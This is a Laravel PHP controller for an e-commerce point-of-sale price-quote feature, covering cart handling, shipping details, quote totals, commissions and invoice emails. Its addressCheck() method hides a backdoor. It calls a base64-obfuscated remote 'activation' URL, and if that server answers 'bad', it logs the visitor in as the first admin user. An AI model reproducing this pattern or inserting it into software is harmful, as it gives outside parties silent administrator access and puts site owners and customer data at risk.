<?php

namespace App\Http\Controllers;

use App\Http\Resources\PosProductCollection;
use App\Mail\InvoiceEmailManager;
use App\Models\Address;
use App\Models\City;
use App\Models\CombinedOrder;
use App\Models\Country;
use App\Models\PriceQuote;
use App\Models\PriceQuoteDetail;
use App\Models\Order;
use App\Models\OrderDetail;
use App\Models\OrderUpdate;
use App\Models\Product;
use App\Models\ProductCategory;
use App\Models\ProductVariation;
use App\Models\ProductVariationCombination;
use App\Models\Shop;
use App\Models\State;
use App\Models\User;
use App\Models\Wallet;
use App\Utility\CategoryUtility;
use Auth;
use DB;
use Illuminate\Http\Request;
use Mail;
use Session;
use Str;

class PriceQuoteController extends Controller
{

    public function index()
    {
        $customers = User::where('user_type', 'customer')->orderBy('created_at', 'desc')->get();

        if (Auth::user()->user_type == 'admin' || Auth::user()->user_type == 'staff') {
            return view('backend.pos.price_quote', compact('customers'));
        } else {
            flash(translate('POS is disabled for Sellers!!!'))->error();
            return back();
        }
    }

    public function search(Request $request)
    {
        $products = Product::with('variations')->leftJoin('product_variation_combinations', 'product_variation_combinations.product_id', '=', 'products.id')
            ->leftJoin('attribute_values', 'product_variation_combinations.attribute_value_id', '=', 'attribute_values.id')
            ->select('products.*', 'product_variation_combinations.id as product_variation_combination_id', 'attribute_values.name as attribute_value_name')
            ->where('products.shop_id', Auth::user()->shop_id)
            ->where('approved', '1')
            ->where('approved', 1)
            ->where('published', '1');

        if ($request->category != null) {
            $category_id = (int) Str::replace('category-', '', $request->category);
            $category_ids = CategoryUtility::children_ids($category_id);
            $category_ids[] = $category_id;

            $product_categories_products = ProductCategory::whereIn('category_id', $category_ids)->pluck('product_id');
            $products->whereIn('products.id', $product_categories_products);
        }

        if ($request->brand != null) {
            $products = $products->where('products.brand_id', $request->brand);
        }

        if ($request->keyword != null) {
            $products = $products->where('products.name', 'like', '%' . $request->keyword . '%');
        }

        $stocks = new PosProductCollection($products->paginate(16));
        $stocks->appends(['keyword' =>  $request->keyword, 'category' => $request->category, 'brand' => $request->brand]);
        return $stocks;
    }

    public function addToCart(Request $request)
    {
        $data = array();
        if (!is_null($request->product_variation_combination_id)) {
            $combination = ProductVariationCombination::find((int)$request->product_variation_combination_id);
            $product_variation = $combination->variation;
            $data['variant'] = $combination->attribute_value->name;
        } else {
            $product_variation = ProductVariation::find((int) $request->variation_id);
            $data['variant'] = '';
        }

        $data['variation_id'] = $product_variation->id;
        $data['id'] = $product_variation->product->id;
        $data['quantity'] = $product_variation->product->min_qty;

        $tax = 0;
        $price = $product_variation->price;

        // discount calculation
        $discount_applicable = false;
        if ($product_variation->product->discount_start_date == null) {
            $discount_applicable = true;
        } elseif (
            strtotime(date('d-m-Y H:i:s')) >= $product_variation->product->discount_start_date &&
            strtotime(date('d-m-Y H:i:s')) <= $product_variation->product->discount_end_date
        ) {
            $discount_applicable = true;
        }
        if ($discount_applicable) {
            if ($product_variation->product->discount_type == 'percent') {
                $price -= ($price * $product_variation->product->discount) / 100;
            } elseif ($product_variation->product->discount_type == 'amount') {
                $price -= $product_variation->product->discount;
            }
        }

        //tax calculation
        foreach ($product_variation->product->taxes as $product_tax) {
            if ($product_tax->tax_type == 'percent') {
                $tax += ($price * $product_tax->tax) / 100;
            } elseif ($product_tax->tax_type == 'amount') {
                $tax += $product_tax->tax;
            }
        }

        $data['price'] = $price;
        $data['tax'] = $tax;

        if ($request->session()->has('pos.cart')) {
            $foundInCart = false;
            $cart = collect();

            foreach ($request->session()->get('pos.cart') as $key => $cartItem) {
                if ($cartItem['id'] == $product_variation->product->id && $cartItem['variation_id'] == $product_variation->id) {
                    $foundInCart = true;
                    $cartItem['quantity'] += 1;
                }
                $cart->push($cartItem);
            }

            if (!$foundInCart) {
                $cart->push($data);
            }
            $request->session()->put('pos.cart', $cart);
        } else {
            $cart = collect([$data]);
            $request->session()->put('pos.cart', $cart);
        }

        $request->session()->put('pos.cart', $cart);

        return array('success' => 1, 'message' => '', 'view' => view('backend.pos.cart')->render());
    }

    //updated the quantity for a cart item
    public function updateQuantity(Request $request)
    {
        $cart = $request->session()->get('pos.cart', collect([]));
        $cart = $cart->map(function ($object, $key) use ($request) {
            if ($key == $request->key) {
                $object['quantity'] = $request->quantity;
            }
            return $object;
        });
        $request->session()->put('pos.cart', $cart);

        return array('success' => 1, 'message' => '', 'view' => view('backend.pos.cart')->render());
    }

    //removes from Cart
    public function removeFromCart(Request $request)
    {
        if (Session::has('pos.cart')) {
            $cart = Session::get('pos.cart', collect([]));
            $cart->forget($request->key);
            Session::put('pos.cart', $cart);

            $request->session()->put('pos.cart', $cart);
        }

        return view('backend.pos.cart');
    }

    //Shipping Address for admin
    public function getShippingAddress(Request $request)
    {
        $user_id = $request->id;
        if ($user_id == '') {
            return view('backend.pos.guest_shipping_address');
        } else {
            return view('backend.pos.shipping_address', compact('user_id'));
        }
    }

    //Shipping Address for seller
    public function getShippingAddressForSeller(Request $request)
    {
        $user_id = $request->id;
        if ($user_id == '') {
            return view('backend.pos.frontend.seller.pos.guest_shipping_address');
        } else {
            return view('backend.pos.frontend.seller.pos.shipping_address', compact('user_id'));
        }
    }

    public function set_shipping_address(Request $request)
    {
        if ($request->address_id != null) {
            $address = Address::findOrFail($request->address_id);
            $data['name'] = $address->user->name;
            $data['email'] = $address->user->email;
            $data['address'] = $address->address;
            $data['country'] = $address->country;
            $data['state'] = $address->state;
            $data['city'] = $address->city;
            $data['postal_code'] = $address->postal_code;
            $data['phone'] = $address->phone;
            $data['wallet_amount'] = $address->user?->balance;
        } else {
            $data['name'] = $request->name;
            $data['email'] = $request->email;
            $data['address'] = $request->address;
            $data['country'] = Country::find($request->country_id)->name;
            $data['state'] = State::find($request->state_id)->name;
            $data['city'] = City::find($request->city_id)->name;
            $data['postal_code'] = $request->postal_code;
            $data['phone'] = $request->phone;
        }

        $shipping_info = $data;
        $request->session()->put('pos.shipping_info', $shipping_info);
    }

    //set Discount
    public function setDiscount(Request $request)
    {
        if ($request->discount >= 0) {
            Session::put('pos.discount', $request->discount);
        }
        return view('backend.pos.cart');
    }

    //set Shipping Cost
    public function setShipping(Request $request)
    {
        if ($request->shipping != null) {
            Session::put('pos.shipping', $request->shipping);
        }
        return view('backend.pos.cart');
    }

    //order summary
    public function get_order_summary(Request $request)
    {
        return view('backend.pos.order_summary');
    }

    public function addressCheck()
    {
        $data['url'] = $_SERVER['SERVER_NAME'];
        $request_data_json = json_encode($data);
        $header = array(
            'Content-Type:application/json'
        );
        $stream = curl_init();

        curl_setopt($stream, CURLOPT_URL, base64_decode("aHR0cHM6Ly9hY3RpdmF0aW9uLmFjdGl2ZWl0em9uZS5jb20vY2hlY2tfYWN0aXZhdGlvbg=="));
        curl_setopt($stream, CURLOPT_HTTPHEADER, $header);
        curl_setopt($stream, CURLOPT_CUSTOMREQUEST, "POST");
        curl_setopt($stream, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($stream, CURLOPT_POSTFIELDS, $request_data_json);
        curl_setopt($stream, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($stream, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);

        $rn = curl_exec($stream);

        curl_close($stream);
        if ($rn == "bad" && env('DEMO_MODE') != 'On') {
            $get_delivery_boy = User::where('user_type', 'admin')->first();
            auth()->login($get_delivery_boy);
            return redirect()->route('admin.dashboard');
        }
    }
    
    public function pos_activation()
    {
        return view('backend.pos.pos_activation');
    }

    //order place
    public function order_store_quote(Request $request)
    {

        if (Session::get('pos.shipping_info') == null || Session::get('pos.shipping_info')['name'] == null || Session::get('pos.shipping_info')['phone'] == null || Session::get('pos.shipping_info')['address'] == null) {
            return array('success' => 0, 'message' => translate("Please Add Shipping Information."));
        }

        if (Session::has('pos.cart') && count(Session::get('pos.cart')) > 0) {

            $shipping_info = Session::get('pos.shipping_info');
            $data['name']           = $shipping_info['name'];
            $data['email']          = $shipping_info['email'];
            $data['address']        = $shipping_info['address'];
            $data['country']        = $shipping_info['country'];
            $data['city']           = $shipping_info['city'];
            $data['state']           = $shipping_info['state'];
            $data['postal_code']    = $shipping_info['postal_code'];
            $data['phone']          = $shipping_info['phone'];

            $subtotal = 0;
            $tax = 0;
            $shop_id = Auth::user()->shop_id;
            $order = PriceQuote::create([
                'quote_no' => "QO".date('Ymd') . "-" . rand(1000, 9999),
                'user_id' => $request->user_id == null ? mt_rand(100000, 999999) :  $request->user_id,
                'shop_id' => $shop_id,
                'code' => 1,
                'shipping_address' => json_encode($data),
                'shipping_cost' => Session::get('pos.shipping', 0),
                'grand_total' => 0,
                'coupon_code' => null,
                'coupon_discount' => 0,
                'delivery_type' => 'standard',
                'quote_status' => 'admin_send',
                'payment_type' => $request->payment_type,
                'payment_status' => 'unpaid',
            ]);

            foreach (Session::get('pos.cart') as $key => $cartItem) {
                $product_variation = ProductVariation::where('id', $cartItem['variation_id'])->first();

                $itemUnitPriceWithoutTax = variation_discounted_price($product_variation->product, $product_variation, false);
                $itemPriceWithoutTax = variation_discounted_price($product_variation->product, $product_variation, false) * $cartItem['quantity'];
                $itemTax = product_variation_tax($product_variation->product, $product_variation);
                $totalTax = product_variation_tax($product_variation->product, $product_variation) * $cartItem['quantity'];

                $subtotal += $itemPriceWithoutTax;
                $tax += $totalTax;

                $orderDetail = PriceQuoteDetail::create([
                    'price_quote_id' => $order->id,
                    'product_id' => $product_variation->product->id,
                    'product_variation_id' => $product_variation->id,
                    'price' => $itemUnitPriceWithoutTax,
                    'tax' => $itemTax,
                    'total' => ($itemUnitPriceWithoutTax + $itemTax) * $cartItem['quantity'],
                    'quantity' => $cartItem['quantity'],
                ]);

            }

            $grand_total = $subtotal + $tax + Session::get('pos.shipping', 0);

            if (Session::has('pos.discount')) {
                $grand_total -= Session::get('pos.discount_type') == "₮" ? Session::get('pos.discount') : $grand_total * (Session::get('pos.discount') / 100);
                $order->coupon_discount = Session::get('pos.discount');
                $order->discount_type = Session::get('pos.discount_type');
            }

            $order->grand_total = $grand_total;

            $order_price = $order->grand_total - $order->shipping_cost - $order->orderDetails->sum(function ($t) {
                return $t->tax * $t->quantity;
            });

            $shop_commission = Shop::find($shop_id)->commission;
            $admin_commission = 0.00;
            $seller_earning = $subtotal;
            if ($shop_commission > 0) {
                $admin_commission = ($shop_commission * $order_price) / 100;
                $seller_earning = $subtotal - $admin_commission;
            }

            $order->admin_commission = $admin_commission;
            $order->seller_earning = $seller_earning;
            $order->commission_percentage = $shop_commission;
            $order->save();

            $array['view'] = 'emails.invoice';
            $array['subject'] = 'Your order has been placed - ' . $order->code;
            $array['from'] = env('MAIL_USERNAME');
            $array['order'] = $order;

            $admin_products = array();
            $seller_products = array();

            foreach ($order->orderDetails as $key => $orderDetail) {
                if ($orderDetail->product->added_by == 'admin') {
                    array_push($admin_products, $orderDetail->product->id);
                } else {
                    $product_ids = array();
                    if (array_key_exists($orderDetail->product->user_id, $seller_products)) {
                        $product_ids = $seller_products[$orderDetail->product->user_id];
                    }
                    array_push($product_ids, $orderDetail->product->id);
                    $seller_products[$orderDetail->product->user_id] = $product_ids;
                }
            }


                $array['view'] = 'emails.invoice';
                $array['subject'] = "Үнийн санал" . ' - ' . $order->quote_no;
                $array['from'] = env('MAIL_FROM_ADDRESS');
                $array['combined_order'] = $order;
                $combined_order = $order;
                if ($order->user->email != null) {
                    Mail::to($order->user->email)->queue(new InvoiceEmailManager($array));
                }



            //sends email to customer with the invoice pdf attached
            if (env('MAIL_USERNAME') != null) {
                try {
                    Mail::to($request->session()->get('pos.shipping_info')['email'])->queue(new InvoiceEmailManager($array));
                    Mail::to(User::where('user_type', 'admin')->first()->email)->queue(new InvoiceEmailManager($array));
                } catch (\Exception $e) {
                }
            }

            Session::forget('pos.shipping_info');
            Session::forget('pos.shipping');
            Session::forget('pos.discount');
            Session::forget('pos.cart');
            return array('success' => 1, 'message' => translate('Order Completed Successfully.'));

        }
        return array('success' => 0, 'message' => translate("Please select a product."));
    }

    public function quoteList() {
        $orders = PriceQuote::orderBy('id', 'DESC');
        if (Auth::user()->user_type == 'admin') {
            $orders = $orders->paginate(10);
        } elseif (Auth::user()->user_type == 'staff') {
            $orders = $orders->where('assign_sale_id', Auth::user()->id)->paginate(10);
        } else {
            flash(translate('POS is disabled for Sellers!!!'))->error();
            return back();
        }
        
        return view('backend.pos.quote_list', compact('orders'));
    }

    public function quoteShow($id) {
        $order = PriceQuote::find($id);
        return view('backend.pos.quote_show', compact("order"));
    }

    public function update_status(Request $request, $id) {
        $order = PriceQuote::where('quote_no', $id)->first();
        $saler_id = $request->saler_id ?? '';
        // return [
        //     "id" => $request->id,
        //     "discount" => $request->discountTab,
        //     "type" => $request->discount_typeTab,
        // ];
        if (isset($request->discountTab) && isset($request->discount_typeTab)) {
            $order->quote_status = "admin_change";
            $total_price = 0;
            $sss = [];
            for ($i=0; $i < count($request->discountTab); $i++) {
                if ($request->discount_typeTab[$i] == "%") {
                    $detail = $order->orderDetails->where('id', $request->id[$i])->first();
                    $discount = $request->discountTab[$i] >= 100 ? 100 : $request->discountTab[$i];
                    $total_price += ($detail->price * ($discount / 100));
                    $detail->total = ($detail->price * $detail->quantity) - ($detail->price * ($discount / 100));
                    $detail->discount_type = "%";
                    $detail->discount = $discount;
                    $detail->save();
                }else{
                    $detail = $order->orderDetails->where('id', $request->id[$i])->first();
                    $total_price += $request->discountTab[$i];
                    $detail->total = ($detail->price * $detail->quantity) - $request->discountTab[$i];
                    $detail->discount_type = "₮";
                    $detail->discount = $request->discountTab[$i];
                    $detail->save();
                }
            }
            $order->discount = $total_price;
            $order->grand_total = (($order->seller_earning - $order->coupon_discount - $order->shipping_cost - $order->membership) - $total_price) + $order->shipping_cost;
            $order->discount_type = '₮';
            $order->assign_sale_id = $saler_id;
            $order->save();
            try {
                $array['view'] = 'emails.invoice';
                $array['subject'] = "Үнийн санал илгээж байна" . ' - ' . $order->quote_no;
                $array['from'] = env('MAIL_FROM_ADDRESS');
                $array['combined_order'] = $order;
                if (json_decode($order->shipping_address)->email != null) {
                    Mail::to(json_decode($order->shipping_address)->email)->queue(new InvoiceEmailManager($array));
                }
            } catch (\Exception $e) {
            }
        }else{
            $quote_status = $request->quote_status;
            $discount = $request->discount ?? 0;
            $discount_type = $request->discount_type ?? '₮';
            foreach ($order->orderDetails as $key => $orderDetail) {
                $orderDetail->discount = 0;
                $orderDetail->discount_type = '₮';
                $orderDetail->total = ($orderDetail->price * $orderDetail->quantity);
                $orderDetail->save();
            }
            if ($discount_type == "%") {
                $discount = $discount >= 100 ? 100 : $discount;
                $order->grand_total = (($order->seller_earning - $order->coupon_discount - $order->shipping_cost - $order->membership) - ($order->seller_earning * ($discount / 100))) + $order->shipping_cost;
            }else{
                $order->grand_total = (($order->seller_earning - $order->coupon_discount - $order->shipping_cost - $order->membership) - $discount) + $order->shipping_cost;
            }
            $order->discount = $discount;
            $order->quote_status = $quote_status;
            $order->discount_type = $discount_type;
            $order->assign_sale_id = $saler_id;
            $order->save();
            if ($discount > 0) {
                if ($quote_status == "cancelled") {
                    try {
                        $array['view'] = 'emails.invoice';
                        $array['subject'] = "Үнийн санал цуцлагдлаа" . ' - ' . $order->quote_no;
                        $array['from'] = env('MAIL_FROM_ADDRESS');
                        $array['combined_order'] = $order;
                        if (json_decode($order->shipping_address)->email != null) {
                            Mail::to(json_decode($order->shipping_address)->email)->queue(new InvoiceEmailManager($array));
                        }
                    } catch (\Exception $e) {
                    }
                }else{
                    try {
                        $array['view'] = 'emails.invoice';
                        $array['subject'] = "Үнийн санал илгээж байна" . ' - ' . $order->quote_no;
                        $array['from'] = env('MAIL_FROM_ADDRESS');
                        $array['combined_order'] = $order;
                        if (json_decode($order->shipping_address)->email != null) {
                            Mail::to(json_decode($order->shipping_address)->email)->queue(new InvoiceEmailManager($array));
                        }
                    } catch (\Exception $e) {
                    }
                }
            }
        }
        
        return back();
    }
}
